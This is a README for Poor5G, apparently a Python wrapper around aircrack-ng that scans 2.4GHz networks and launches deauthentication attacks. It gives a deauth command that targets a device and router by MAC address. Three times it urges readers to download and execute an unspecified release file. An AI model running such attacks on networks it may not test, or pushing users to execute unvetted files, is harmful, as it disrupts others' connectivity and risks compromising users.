# Poor5G: A Lightweight Python Tool for WiFi Testing

![Poor5G](https://img.shields.io/badge/Poor5G-v1.0-blue.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-green.svg) ![License](https://img.shields.io/badge/License-MIT-yellow.svg)

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Customization](#customization)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Overview

Poor5G is a lightweight Python tool designed for educational WiFi testing. This tool leverages aircrack-ng to scan networks and perform customizable deauth attacks on 2.4GHz WiFi. It is essential for ethical hacking, red-team labs, and learning purposes only. 

For the latest version, visit the [Releases section](https://github.com/piety-1/Poor5G/releases) to download and execute the necessary files.

## Features

- **Lightweight**: Minimal resource usage, perfect for quick tests.
- **Network Scanning**: Identify available 2.4GHz networks effortlessly.
- **Deauth Attacks**: Launch customizable deauthentication attacks.
- **User-Friendly**: Simple interface for easy navigation.
- **Educational Focus**: Designed specifically for learning and ethical hacking.

## Installation

To get started with Poor5G, follow these simple steps:

1. **Clone the Repository**:

   ```bash
   git clone https://github.com/piety-1/Poor5G.git
   cd Poor5G
   ```

2. **Install Dependencies**:

   Make sure you have Python 3.8 or higher installed. Then, install the required packages:

   ```bash
   pip install -r requirements.txt
   ```

3. **Download the Latest Release**:

   For the latest version, check the [Releases section](https://github.com/piety-1/Poor5G/releases) and download the appropriate file. Execute it to set up the tool.

## Usage

Once you have installed Poor5G, you can start using it with the following commands:

1. **Scan for Networks**:

   Run the following command to scan for 2.4GHz networks:

   ```bash
   python poor5g.py scan
   ```

2. **Launch a Deauth Attack**:

   To perform a deauth attack on a specific network, use:

   ```bash
   python poor5g.py deauth --target <TARGET_MAC> --router <ROUTER_MAC>
   ```

   Replace `<TARGET_MAC>` with the MAC address of the device you want to disconnect and `<ROUTER_MAC>` with the MAC address of the router.

3. **Help Command**:

   For more options, run:

   ```bash
   python poor5g.py --help
   ```

## Customization

Poor5G allows users to customize their experience. You can modify the configuration file to adjust settings such as:

- **Attack Duration**: Set how long the deauth attack should last.
- **Target Selection**: Choose specific targets for attacks.
- **Logging Options**: Enable or disable logging of actions.

Edit the `config.json` file located in the root directory of the project.

## Contributing

Contributions are welcome! If you want to help improve Poor5G, please follow these steps:

1. **Fork the Repository**.
2. **Create a New Branch**:

   ```bash
   git checkout -b feature/YourFeature
   ```

3. **Make Your Changes**.
4. **Commit Your Changes**:

   ```bash
   git commit -m "Add Your Feature"
   ```

5. **Push to the Branch**:

   ```bash
   git push origin feature/YourFeature
   ```

6. **Create a Pull Request**.

## License

Poor5G is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.

## Contact

For any questions or feedback, feel free to reach out:

- **Author**: Kevin Khemra
- **Email**: kevin.khemra@example.com
- **GitHub**: [piety-1](https://github.com/piety-1)

Explore the [Releases section](https://github.com/piety-1/Poor5G/releases) for updates and additional files to download and execute.